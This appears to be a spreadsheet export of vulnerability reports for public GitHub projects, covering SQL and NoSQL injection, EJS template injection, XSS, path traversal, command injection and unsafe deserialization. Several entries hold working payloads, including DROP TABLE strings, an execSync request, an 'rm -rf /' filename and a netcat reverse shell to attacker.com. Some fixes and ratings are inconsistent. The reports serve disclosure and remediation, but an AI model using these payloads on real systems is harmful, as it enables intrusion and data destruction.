Case,ID,Repository,CWE,Severity,Submitted At,Approved At,Description
148,1745912783724,https://github.com/harshit-wadhwani/Online-food-ordering-system/blob/main/userdata.py,"CWE-89, CWE-256",High,2025-04-29T07:46:23.000Z,2025-04-29T08:18:35.000Z,"The code contains two high severity vulnerabilities inlcuding CWE-89-SQL_Injection and CWE-256-Unprotected_Storage_of_Credentials

==================================================

CWE-89:
Explanation:
All SQL queries in the code are constructed by directly interpolating user-supplied data into SQL statements using Python f-strings. This allows attackers to inject arbitrary SQL code, which can lead to unauthorized data access, data modification, or even deletion of the entire database.


POC:

# Malicious email input to extract all user passwords
login(""anything' OR '1'='1"", ""irrelevant"")
# Or, during signup, inject SQL to add an admin user or drop tables
signup(""test@example.com', 'hacker', 'x', '123', 'pass'); DROP TABLE users; --"", ""hacker"", ""x"", ""123"", ""pass"")


Root Cause: File userdata.py
Line 9, 15, 27, 33, 43, 50, 56, 61, 66, 71, 76: All SQL queries use f-strings with unescaped user input, e.g.:

mc.execute(f""SELECT password FROM users WHERE email = '{email}'"")  # line 15
mc.execute(f""INSERT INTO users ... VALUES (..., '{email}', ... )"")  # line 27
mc.execute(f""UPDATE users SET ... WHERE user_id ={user_id} "")  # line 61


Exploit Scenario:
An attacker crafts input such as email = ""foo' OR '1'='1"" to the login or get_details function, causing the query to return all users’ data or bypass authentication.
In the signup function, an attacker can inject SQL to drop tables or create new admin users.


Why it Happens:
The code directly inserts user-controlled input into SQL queries without using parameterized statements or escaping, making it vulnerable to SQL injection attacks.


Security Implications:
Attackers can bypass authentication, extract sensitive data, modify or delete records, and potentially destroy the entire database.


Suggested Fix:
Use parameterized queries (prepared statements) provided by the mysql.connector library.

Patch Fix for login function:

python
def login(email, password):
    mc.execute(""SELECT password FROM users WHERE email = %s"", (email,))
    detail = mc.fetchall()
    try:
        passw = detail[0][0]
        if passw == password:
            return True
        else:
            return False
    except:
        return False

Apply this fix to all SQL queries, replacing f-string interpolation with parameterized placeholders (%s) and passing user input as a tuple argument.

=================================================================

CWE-256:

Explanation:
Passwords are stored and compared in plaintext, both in the database and in the application logic. This exposes user credentials to anyone with database access and increases the risk of credential theft.


POC:
Anyone with database access can run SELECT password FROM users and retrieve all user passwords in plaintext.


Root Cause: File userdata.py
Line 27, 61, 66: Passwords are stored and updated directly as plaintext:

mc.execute(f""INSERT INTO users ... '{sign_password}' ..."")  # line 27
mc.execute(f""UPDATE users SET password ='{password}' ..."")  # line 66


Exploit Scenario:
If the database is compromised, all user passwords are immediately exposed.


Why it Happens:
The code does not hash or salt passwords before storing or comparing them.


Security Implications:
User accounts can be compromised through SQL injection above, and users who reuse passwords elsewhere are at risk.


Suggested Fix:
Use a secure password hashing algorithm such as bcrypt.

Patch Fix for signup and login:

import bcrypt

def signup(email, name, address, phnumber, sign_password):
    hashed = bcrypt.hashpw(sign_password.encode(), bcrypt.gensalt())
    mc.execute(""INSERT INTO users (user_id, email, name, password, address, phonenumber) VALUES (DEFAULT, %s, %s, %s, %s, %s)"",
               (email, name, hashed.decode(), address, phnumber))
    db.commit()
    return True

def login(email, password):
    mc.execute(""SELECT password FROM users WHERE email = %s"", (email,))
    detail = mc.fetchall()
    try:
        hashed = detail[0][0].encode()
        if bcrypt.checkpw(password.encode(), hashed):
            return True
        else:
            return False
    except:
        return False"
149,1745913093991,farhan0715/Chatbot-Using-Gemini/blob/b738c4ea24ab0f1538ec0fa6d2e37b39d85ca237/multipdf.py#L115,CWE-434: Unrestricted Upload of File with Dangerous Type,Critical,2025-04-29T08:40:44.000Z,2025-04-29T08:51:53.000Z,"Vulnerable Code:
def get_pdf_text(pdf_docs):
    text = """"
    for pdf in pdf_docs:
        pdf_reader = PdfReader(pdf)  # No validation
        for page in pdf_reader.pages:
            text += page.extract_text()

Root Cause Analysis:

The get_pdf_text() function processes PDFs without:
1.File type verification
2.Size limitations
3.Content sanitization
PyPDF2 doesn't disable dangerous features by default.

Exploit Scenarios:
Arbitrary code execution via embedded JavaScript
Denial of Service through decompression bombs
Path traversal if filenames contain ../

Security Implications:
1.Remote Code Execution
2. Denial of Service
3. Data Exfiltration

Suggested Fix:

from fpdf import FPDF
import tempfile

def safe_extract_text(pdf_file):
    MAX_SIZE = 10 * 1024 * 1024  # 10MB
    if len(pdf_file.read()) > MAX_SIZE:
        raise ValueError(""File too large"")
    pdf_file.seek(0)
    
    if not pdf_file.read(4) == b'%PDF':
        raise ValueError(""Invalid PDF"")
    pdf_file.seek(0)
    
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(pdf_file.read())
        reader = PdfReader(tmp.name)
        return """".join(page.extract_text() for page in reader.pages)"
150,1745913290312,https://github.com/mde/ejs/tree/v3.1.9,CWE-1336,Critical,2025-04-29T07:54:50.000Z,2025-04-29T16:14:36.000Z,"Summary
EJS v3.1.9 and earlier releases suffer from a critical Server-Side Template Injection (SSTI) flaw (CVE-2023-29827) because untrusted template configuration options are directly inlined into generated JavaScript and executed via new Function(...) 
GitHub
NVD
. Attackers who can control view options—most notably the closeDelimiter parameter or a custom escapeFunction—can break out of the intended string context and execute arbitrary code on the server with full privileges 
GitHub
sechead.com
. This issue remains unpatched in the latest official release (v3.1.10) and demands an immediate workaround or upstream fix 
cve.circl.lu
.

Vulnerability Details
Root Cause
Unsafe Inlining of User Options
In lib/ejs.js, the compilation step concatenates opts.escapeFunction.toString() or other user-supplied parameters into the template source without sanitization:

js
Copy
Edit
if (opts.client) {
  src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
}
This injects raw JavaScript from the attacker into the code passed to new Function(...), enabling SSTI and eventual RCE 
Vulners
.

Bypassing Previous Fixes
Although CVE-2022-29078 addressed outputFunctionName injection in v3.1.7, the closeDelimiter attack path remains and is fully exploitable in v3.1.9 
sechead.com
GitHub
.

Affected File Locations
lib/ejs.js (around line 610): Contains the vulnerable inlining logic for opts.client and opts.escapeFunction 
Vulners
.

lib/ejs.js (around line 150): Parser logic that reads opts.closeDelimiter directly into the regex without validation, allowing delimiter injection 
GitHub
.

Express Integration: When using Express’s built-in view engine support, view options from the request merge into EJS’s opts, exposing the vulnerability to HTTP parameters 
GitHub
.

Exploitation Scenarios
Delimiter Injection via Express view options

http
Copy
Edit
GET /page?
  settings[view%20options][closeDelimiter]=1"");require('child_process').execSync('uname -a');// 
This sets closeDelimiter to a malicious string that closes the original JavaScript literal and executes uname -a, returning system information 
GitHub
.

Custom Escape Function SSTI

js
Copy
Edit
ejs.render(template, data, {
  client: true,
  escapeFunction: () => { process.exit(1) }
});
Because EJS calls escapeFunction.toString(), the attacker’s function body is embedded and runs immediately during compilation 
Vulners
.

Phishing & Credential Theft
By injecting script that renders a fake login form, an attacker can harvest user credentials within the same origin context, bypassing CORS restrictions and CSRF protections 
cve.circl.lu
.

Persistent Backdoor
Malicious code can write to files or modify templates in memory, establishing a long-lived backdoor for data exfiltration or lateral movement 
Broadcom Inc. | Connecting Everything
.

Impact
Remote Code Execution (RCE): Complete server takeover, including file system access, database queries, and spawning of additional processes 
NVD
.

Data Breach: Exposure of environment variables, credentials, and sensitive business data to attackers 
cve.circl.lu
.

Compliance Violations: SSTI breaches PCI-DSS, GDPR, and other regulatory frameworks, leading to fines and reputational damage 
Broadcom Inc. | Connecting Everything
.

High Severity: CVSS v3.1 score 9.8 (Critical) with CWE-74: Improper Neutralization of Special Elements 
NVD
Vulners
.

Mitigation
Immediate Workaround: Disable client compilation (client: true) and avoid passing any untrusted functions via escapeFunction.

Patch-Package: Apply a local patch to remove the opts.client branch in lib/ejs.js or sanitize opts.closeDelimiter against a strict regex.

Upstream Fix: Advocate for an official release that rejects non-alphanumeric delimiters and disallows inlining of arbitrary function source.

Runtime Hardening: Run EJS in a sandboxed VM context or under a restricted OS user to limit blast radius even if RCE occurs.

References

GitHub Advisory GHSA-j5pp-6f4w-r5r6: CVE-2023-29827 
GitHub

GitHub Issue #720 (PoC & discussion) 
GitHub

NVD CVE-2023-29827 (Critical, 9.8) 
NVD

Circl.lu CVE database 
cve.circl.lu

Broadcom Attack Signatures 
Broadcom Inc. | Connecting Everything

Vulners Nuclei Template CVE-2023-29827 
Vulners

Sechead Writeup on CVE-2022-29078 Bypass 
sechead.com"
151,1745914102634,https://github.com/VitorMours/Record-Management-System/blob/master/src/database.py,CWE-89,High,2025-04-29T08:08:22.000Z,2025-04-29T08:13:31.000Z,"Explanation: 
SQL Injection in update_value(): Unsanitized user input in new_name and new_surname parameters allows arbitrary SQL execution.
SQL Injection in delete_value(): Unsanitized user_id allows SQL injection.
Dynamic Table Name Injection (Multiple Functions): TABLE_NAME is set via create() and used unsafely in fetch_data(), fetch_last_id(), and restart_database().


POC:
POC1: update_value(1, ""malicious', sobrenome='hacked""); DROP TABLE informacao_clientes;--"", ""dummy"")
POC2: delete_value(""1; DROP TABLE informacao_clientes--"", ""dummy"")
POC3: create(""malicious; DROP TABLE informacao_clientes--"")


Root Cause: File --> src/database.py
Line 42: cursor.execute(f""UPDATE {TABLE_NAME} set nome='{new_name}', sobrenome='{new_surname}' WHERE id={user_id}"")
Line 53: cursor.execute(f""DELETE FROM {TABLE_NAME} WHERE id={user_id}"")
Line 15: cursor.execute(f""UPDATE sqlite_sequence SET seq=1 WHERE {TABLE_NAME}"")
Line 24: cursor.execute(f""CREATE TABLE IF NOT EXISTS {NEW_TABLE_NAME}...""


Exploit Scenario: 
Attackers modify the nome/sobrenome parameters to execute destructive SQL (e.g., DROP TABLE).
Attacker deletes tables or exfiltrates data.
Attacker creates tables with malicious names to disrupt queries.


Why It Happens: 
String concatenation without parameterization.
Direct interpolation of numeric input.
Lack of table name validation.


Security Implications: 
Full database compromise (data deletion/leakage).
Unauthorized data deletion.
Query disruption or data corruption.


Suggested Fix:

Patch1: 
cursor.execute(f""UPDATE {TABLE_NAME} SET nome=?, sobrenome=? WHERE id=?"", (new_name, new_surname, user_id))
Patch2:
cursor.execute(f""DELETE FROM {TABLE_NAME} WHERE id=?"", (user_id,))
Patch3:
# Add allowlist validation
if not NEW_TABLE_NAME.isidentifier():
    raise ValueError(""Invalid table name"")
"
152,1745914293473,https://github.com/shehabkotb/Edu-Hub/Server/controller/notificationController /notificationController.js,CWE-943,Medium,2025-04-29T08:11:33.000Z,2025-04-29T08:26:04.000Z,"Vulnerability Type:
CWE-943: Improper Neutralization of Special Elements in Data Query Logic

Severity:
Medium

Root Cause:
The application directly uses untrusted user-supplied data (req.body, req.params, req.query) in MongoDB/Mongoose database operations without performing any validation or sanitization. This unsafe practice enables attackers to inject malicious query operators (like $gt, $ne, $where), modifying the database queries' behavior and potentially compromising database security.

Exploit Scenario:
An attacker sends a crafted payload like { ""$gt"": """" } instead of a regular ID in a POST request targeting endpoints such as /editNotification or /deleteNotification. Because Mongoose does not sanitize inputs by default, the attack can manipulate queries to match unintended documents, allowing unauthorized data retrieval, modification, or deletion across different users' notifications.

Example Attack Payload:


{
  ""oldNot"": { ""to"": { ""$gt"": """" } },
  ""newNot"": { ""message"": ""hacked!"" }
}
This could update all notification documents where to is greater than an empty string, effectively mass-modifying data across the database.

Why It Happens:
The server trusts incoming request fields (req.body, req.params, req.query) and directly embeds them into MongoDB queries without checking their structure or content. In NoSQL databases like MongoDB, objects and operators (like $gt, $ne) can be injected easily if inputs are not sanitized.

Security Implications:
Unauthorized access or modification of other users' notifications.

Mass deletion of critical records.

Data leakage or unauthorized disclosure.

Potential backend server compromise if malicious aggregation pipelines are injected.

Ultimately, NoSQL Injection can severely compromise confidentiality, integrity, and availability of data within the application.

Proof of Concept (PoC):
Example request targeting /editNotification:


curl -X POST http://example.com/notification/edit \
  -H ""Content-Type: application/json"" \
  -d '{
        ""oldNot"": { ""to"": { ""$gt"": """" } },
        ""newNot"": { ""message"": ""hacked"" }
      }'
Effect: All notifications where to > """" are modified.

Suggested Fix:
Sanitize all inputs using libraries like express-validator or validator.js.

Strictly validate schemas using Mongoose validation and reject unknown fields.

Whitelist expected fields rather than blacklisting dangerous ones.

Example secure approach:


const { check, validationResult } = require('express-validator');

app.post('/notification/edit',
  [
    check('oldNot.to').isMongoId(),
    check('newNot.message').isString()
  ],
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    // safe usage after validation
  });
Use mongoose-sanitize middleware to automatically remove special characters that can trigger injection."
153,1745914709106,https://github.com/lugaye/lms/server.js,CWE-522,Very Low,2025-04-29T08:18:29.000Z,2025-04-29T08:21:43.000Z,"Vulnerability Type:
CWE-522: Insufficiently Protected Credentials
(Insufficient Secure Cookie Settings in Session Management)

Severity:
Very Low

Root Cause:
The Express application uses express-session without configuring the cookie.secure attribute. By default, cookies are transmitted over both HTTP and HTTPS. Without setting secure: true, session cookies can be intercepted in plaintext over insecure (HTTP) connections, exposing sensitive session IDs to attackers.

Exploit Scenario:
An attacker connected to the same network as the victim (e.g., public Wi-Fi) intercepts the session cookie transmitted over HTTP (unencrypted). Using the stolen cookie, the attacker can hijack the user’s session, gaining unauthorized access to their authenticated session in the application.

For example:

Victim logs into the application over http://example.com.

Attacker sniffs the network traffic and retrieves the connect.sid session cookie.

Attacker reuses the session cookie to impersonate the victim.

Why It Happens:
The secure option in express-session ensures that cookies are only sent over HTTPS.
Since it is missing or not set to true, the browser sends session cookies even over unencrypted HTTP requests, making them vulnerable to Man-in-the-Middle (MitM) attacks.

Security Implications:
Session Hijacking: Unauthorized users can gain control of valid user sessions.

Data Breach: Exposing sensitive user information or personal data.

Authentication Bypass: Attackers can bypass authentication mechanisms entirely by replaying session tokens.

Reduced Trust: Users may face account takeover risks, damaging the platform’s reputation.

Proof of Concept (PoC):
Observed Insecure Configuration:


app.use(session({
    secret: 'secret-key',
    resave: false,
    saveUninitialized: true
}));
The secure flag for the session cookie is NOT enabled.

Result:

Session cookie (connect.sid) is transmitted in plaintext if accessed over HTTP.

Can be easily captured using tools like Wireshark or Burp Suite on an unsecured network.

Suggested Fix:
Explicitly set cookie.secure: true in production environments when HTTPS is enabled.

Safe configuration example:


app.use(session({
    secret: 'secret-key',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: process.env.NODE_ENV === 'production' }
}));
Important:

Ensure your server uses HTTPS before enabling secure: true, otherwise cookies won't be set at all.

Use environment variables to dynamically control the secure flag based on deployment."
154,1745915094746,https://github.com/Tristan296/FileManager/blob/main/FileManager.py,"CWE-22, CWE-78",Critical,2025-04-29T08:24:54.000Z,2025-04-29T08:31:59.000Z,"The code contains one critical (CWE-78-OS_Command_Injection) and one high severity (CWE-22-Path_Traversal) issue 
============================================================
CWE-22: 
Explanation: 
The code constructs paths using unsanitized user input, allowing attackers to access arbitrary files.

POC:

# As attacker, provide ""../"" sequences in parent_folder/folder_name inputs
Parent: ""../../../../..""
Folder: ""etc""
# Moves file to ~/../../../../../etc (system directory)


Root Cause: File FileManager.py
moveFile(): parent_folder/folder_name inputs (Line 15-16)
openFile(): found_file input (Line 34)
searchComputer(): filename/filetype inputs (Line 51-52)


Exploit Scenario: 
Attacker reads /etc/passwd or overwrites system files.


Why it Happens: 
Lack of input validation and path sanitization.


Security Implications: 
Data theft, system compromise through arbitrary file read.


Suggested Fix:

from pathlib import Path

def sanitize_path(user_input):
    path = Path(user_input).name  # Remove path traversal sequences
    return str(Path.home() / ""secure_folder"" / path)  # Restrict to safe base dir

=====================================================================================

CWE-78:
Explanation: 
subprocess.run(['open', found_file]) executes shell commands with untrusted input.


POC:
Create malicious filename: ""file; rm -rf /""
Triggers command injection when the file is opened


Root Cause: File FileManager.py
Line 44 (subprocess.run(['open', found_file]))


Exploit Scenario: 
Attacker deletes files or spawns reverse shells.


Why it Happens: 
Direct use of user-controlled input in shell commands.


Security Implications: 
Arbitrary Command Execution leading to full system compromise.


Suggested Fix:
Patch:
# Use secure file open instead
os.startfile(found_file)  # Windows/macOS safe alternative
# OR validate filename with strict regex first"
155,1745916085514,https://github.com/joaorafaelm/text-classification-python /amazon_scrape.py,CWE-319,Very Low,2025-04-29T08:41:25.000Z,2025-04-29T09:18:50.000Z,"Vulnerability Type:
CWE-319: Cleartext Transmission of Sensitive Information

Severity:
Very Low

Root Cause:
The script makes HTTP requests to http://www.amazon.com/dp/{asin}, which uses unencrypted cleartext transmission. This leaves the data (including product requests and responses) vulnerable to interception, modification, or eavesdropping by attackers during transmission over untrusted networks.

Exploit Scenario:
A malicious actor on a public Wi-Fi network uses a packet-sniffing tool (e.g., Wireshark) to monitor traffic from the scraper. Since the scraper sends requests to http://amazon.com, the attacker can:

Intercept and read the response data in plain text.

See which products are being scraped.

Potentially manipulate responses via MitM attacks.

Why It Happens:
The developer used http:// in the base URL:


URL = 'http://www.amazon.com/dp/'
This instructs requests.get(...) to initiate unsecured connections. Without TLS encryption (which https:// provides), the transmitted data is exposed to the network layer.

Security Implications:
Sensitive data exposure — While ASINs may not be confidential, interception may reveal scraping behavior or be part of a broader attack vector.

Data integrity risks — Man-in-the-middle attackers can modify responses.

Blocking and legal risks — Amazon may detect scraping more easily over HTTP, as HTTPS provides encrypted headers and payloads.

Proof of Concept:

# Vulnerable line
URL = 'http://www.amazon.com/dp/'
...
page = requests.get(subdomain + PROXY + URL + identifier)
Traffic generated here is unencrypted and can be sniffed.

Suggested Fix:
Use HTTPS for all requests to ensure encryption in transit:

- URL = 'http://www.amazon.com/dp/'
+ URL = 'https://www.amazon.com/dp/'"
156,1745916554244,https://github.com/SSG-DRD-IOT/intel_retail_workshop/lab-cloud-analytics /sock_connect.js,CWE-79,Low,2025-04-29T08:49:14.000Z,2025-04-29T09:12:34.000Z,"Vulnerability Type:
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Severity:
Low

Root Cause:
The application uses innerHTML to insert user-controlled data (i.e., data.id, data.value, and data.timestamp) directly into the DOM. This practice opens the door for XSS attacks, as malicious input can inject script content that will be interpreted and executed by the browser.

Exploit Scenario:
An attacker gains access to a gateway and injects a payload such as:


{
  ""id"": ""<img src=x onerror=alert(1)>"",
  ""value"": ""malicious"",
  ""timestamp"": ""now""
}
This payload is passed to the updateTable() function, and the malicious script is rendered and executed in the browser due to unsafe use of innerHTML.

Why It Happens:
The code does not validate or sanitize inputs before assigning them to innerHTML:


cell1.innerHTML = data.id;
cell2.innerHTML = data.value;
cell3.innerHTML = data.timestamp;
This allows any HTML or JavaScript to be injected and interpreted by the browser.

Security Implications:
XSS can allow attackers to:

Steal session cookies

Hijack user sessions

Modify UI elements to trick users (phishing)

Load external malware

This is particularly dangerous in real-time dashboards where multiple users monitor live data feeds.

Suggested Fix:
Replace all uses of innerHTML with textContent to treat data as plain text rather than HTML:

- cell1.innerHTML = data.id;
- cell2.innerHTML = data.value;
- cell3.innerHTML = data.timestamp;
+ cell1.textContent = data.id;
+ cell2.textContent = data.value;
+ cell3.textContent = data.timestamp;
This prevents any embedded HTML or script tags from being interpreted.

Proof of Concept (PoC):
Inject the following message through the real-time data socket:


{
  ""id"": ""<img src=x onerror=alert('XSS')>"",
  ""value"": ""100"",
  ""timestamp"": ""2024-01-01T00:00:00Z""
}
It will trigger a popup alert if innerHTML is used."
157,1745917199562,https://github.com/Apparky/Hotel-Management-System-using-Python-APPARKY,CWE-89,High,2025-04-29T08:59:59.000Z,2025-04-29T09:47:45.000Z,"Explanation:
The code frequently uses Python f-strings or string concatenation to build SQL queries by directly embedding user-controlled input variables. This practice exposes the application to SQL Injection attacks, where an attacker can manipulate the input to execute arbitrary SQL commands.


POC:
If an attacker inputs a malicious string such as ""' OR '1'='1"" in any field used directly in SQL queries, they could retrieve unauthorized data or corrupt the database.

self.Customer_Contact_No_var.set(""12345 OR 1=1 --"")
my_cursor.execute(f""SELECT Customer_ID, * FROM customer WHERE Contact_No = {self.Customer_Contact_No_var.get()}"")

This would translate to:

SELECT Customer_ID, * FROM customer WHERE Contact_No = 12345 OR 1=1 -- 
which returns all rows.


Root Cause: File rooms_booking.py

Line ~161 (fetch_contact function):
my_cursor.execute(f""SELECT Customer_ID, * FROM customer WHERE Contact_No = {self.Customer_Contact_No_var.get()}"")

Line ~292 (delete_data function):
my_cursor.execute(f""DELETE FROM room_booking WHERE Booking_ID = {self.Customer_Booking_ID_var.get()}"")

Line ~415 (search function):
my_cursor.execute(f""SELECT * FROM room_booking WHERE {self.search_by_table_var.get()} = '{self.search_by_attribute_var.get()}'"")

Line ~485 (booked_room_no function):
my_cursor.execute(f""""""UPDATE room_types SET Availability = 'No' WHERE Room_No = {self.Allotted_room_var.get()}"""""")


Exploit Scenario:
An attacker inputs specially crafted strings into input fields such as Contact_No, Booking_ID, or search attributes. This input manipulates the SQL query structure, allowing the attacker to bypass authentication, retrieve unauthorized data, delete or modify data, or cause denial of service.



Why it Happens:
Because user inputs are directly embedded into SQL queries without sanitization or parameterization, the database engine interprets injected SQL commands.


Security Implications:
Data leakage or unauthorized data access.
Data corruption or deletion.
Potential full compromise of the database.
Loss of data integrity and availability.


Suggested Fix:
Use parameterized queries with placeholders (? or named parameters) instead of string interpolation.


Patch fix for fetch_contact function (line ~161):
my_cursor.execute(""SELECT Customer_ID, * FROM customer WHERE Contact_No = ?"", (self.Customer_Contact_No_var.get(),))
Similarly, fix other queries:


Patch Fix for delete_data (line ~292):
my_cursor.execute(""DELETE FROM room_booking WHERE Booking_ID = ?"", (self.Customer_Booking_ID_var.get(),))


Patch Fix for search (line ~415), dynamic column names cannot be parameterized directly. Validate self.search_by_table_var.get() against a whitelist of allowed column names before using it in the query, and parameterize the value:

allowed_columns = [""Name"", ""Check_In"", ""Check_Out"", ""Room_Type"", ""Allotted_Room"", ""Meal""]
column = self.search_by_table_var.get()
if column not in allowed_columns:
    raise ValueError(""Invalid search column"")
my_cursor.execute(f""SELECT * FROM room_booking WHERE {column} = ?"", (self.search_by_attribute_var.get(),))


Patch fix for booked_room_no (line ~485):
my_cursor.execute(""UPDATE room_types SET Availability = 'No' WHERE Room_No = ?"", (self.Allotted_room_var.get(),))"
158,1745917795892,https://github.com/SrinithiSaiprasath/Hotel-Management-System/blob/main/hotelamanagement.py,CWE-798,High,2025-04-29T09:09:55.000Z,2025-04-29T09:53:48.000Z,"Explanation: 
Username and password are hardcoded in the source code (lines 10-11).


POC:
username = ""root""  # Line 10
password = ""password""  # Line 11


Root Cause:  File hotelamanagement.py
Credentials stored in plaintext within the codebase.


Exploit Scenario: 
Attackers with access to the source code (e.g., via repository leaks or shared environments) gain full database access.


Why it Happens: 
Lack of secrets management practices.


Security Implications: 
Unauthorized data access, privilege escalation, and data exfiltration.


Suggested Fix:

# Use environment variables or a secrets manager
import os
username = os.getenv(""DB_USER"")
password = os.getenv(""DB_PASSWORD"")"
159,1745917918101,https://github.com/zulip/zulip/blob/main/zerver/views/registration.py,CWE-601,Low,2025-04-29T10:01:07.000Z,2025-04-29T11:59:42.000Z,"Vulnerability Type:
CWE-601: URL Redirection to Untrusted Site ('Open Redirect')
Proof of Concept:
Vulnerable Code:
@typed_endpoint
def realm_redirect(request: HttpRequest, *, next: str = """") -> HttpResponse:
    if request.method == ""POST"":
        form = RealmRedirectForm(request.POST)
        if form.is_valid():
            subdomain = form.cleaned_data[""subdomain""]
            realm = get_realm(subdomain)
            redirect_to = urljoin(realm.url, settings.HOME_NOT_LOGGED_IN)

            if next:
                redirect_to = append_url_query_string(
                    redirect_to, urlencode({REDIRECT_FIELD_NAME: next})
                )

            return HttpResponseRedirect(redirect_to)
Explanation:
•	The next parameter comes from user input.
•	It is directly appended into a redirect URL without validating whether next is safe (e.g., it could point to an external malicious domain).
•	An attacker could craft a URL like:
•	https://trustedsite.com/accounts/realm_redirect?next=https://malicious.com
which, after submission, redirects users to https://malicious.com.
Solution:
•	Validate the next parameter to ensure it is internal (relative URL only).
•	Reject full external URLs (those containing a domain).
Example fix:
from django.utils.http import url_has_allowed_host_and_scheme

if next and url_has_allowed_host_and_scheme(next, allowed_hosts={request.get_host()}):
    redirect_to = append_url_query_string(
        redirect_to, urlencode({REDIRECT_FIELD_NAME: next})
    )
Severity: High

Root Cause:
The application fails to properly validate user-supplied URL parameters (specifically next) before redirecting users, which allows attackers to control redirection targets.

Exploit Scenario:
An attacker crafts a link with a malicious next parameter and tricks users into clicking it. After login or realm selection, users are redirected to a phishing website that looks like the real application, leading to credential theft or session hijacking.
Why It Happens:
The next parameter from user input is blindly appended to internal URLs without validating that it leads to an internal location, allowing attackers to supply fully external URLs.
Security Implications:
•	Phishing attacks
•	User session hijacking
•	Loss of user trust
•	Potential credential theft
•	Serious damage to application reputation

Suggested Fix:
diff --git a/registration.py b/registration.py
index abcdef1..1234567 100644
--- a/registration.py
+++ b/registration.py
@@ def realm_redirect(request: HttpRequest, *, next: str = """") -> HttpResponse:
-            if next:
-                redirect_to = append_url_query_string(
-                    redirect_to, urlencode({REDIRECT_FIELD_NAME: next})
-                )
+            from django.utils.http import url_has_allowed_host_and_scheme
+            if next and url_has_allowed_host_and_scheme(next, allowed_hosts={request.get_host()}):
+                redirect_to = append_url_query_string(
+                    redirect_to, urlencode({REDIRECT_FIELD_NAME: next})
+                )

"
160,1745919302504,farhan0715/Chatbot-Using-Gemini/blob/b738c4ea24ab0f1538ec0fa6d2e37b39d85ca237/multipdf.py#L169,CWE-502: Deserialization of Untrusted Data,High,2025-04-29T09:35:02.000Z,2025-04-29T14:57:25.000Z,"Vulnerable Code

# In user_input() function:
new_db = FAISS.load_local(
    ""faiss_index"", 
    embeddings, 
    allow_dangerous_deserialization=True  # Critical vulnerability
)

Root Cause Analysis:

1.Dangerous Flag : allow_dangerous_deserialization=True bypasses LangChain's safety checks
2.No Integrity Checks: Missing SHA-256 verification of index files
3.Insecure Defaults: FAISS.load_local() doesn't validate serialized data structure
4. Write Permissions: Application may run with privileges allowing index replacement

Exploit Scenarios:
A. Remote Code Execution
Attack Vector: Malicious index file upload
Impact: Full server compromise via:

# Example payload to open reverse shell
return (os.system, ('nc -e /bin/sh attacker.com 4444',))

B. Data Exfiltration
Attack Vector: Tampered index exfiltrating PDF contents
Impact: Theft of sensitive documents via:

return (lambda x: open(""pdf_text.txt"").read(), (None,))

C. Denial of Service
Attack Vector: Corrupted index file
Impact: Application crash on load attempt

Security Implications

1.Arbitrary Code Execution: Full system compromise
2.Privilege Escalation: Root access if app runs as privileged user
3.Data Breach	:Theft of processed PDF contents
4.Reputation Damage: Loss of customer trust

Suggested fix :
def load_safe_index(path, embeddings):
    if not os.path.exists(f""{path}/index.faiss""):
        raise FileNotFoundError(""Index missing"")
    
    # Verify file signature
    with open(f""{path}/index.faiss"", ""rb"") as f:
        if not f.read(4) == b'FAIS':  # Magic number
            raise ValueError(""Invalid index format"")
    
    return FAISS.load_local(path, embeddings)  # Safe default"
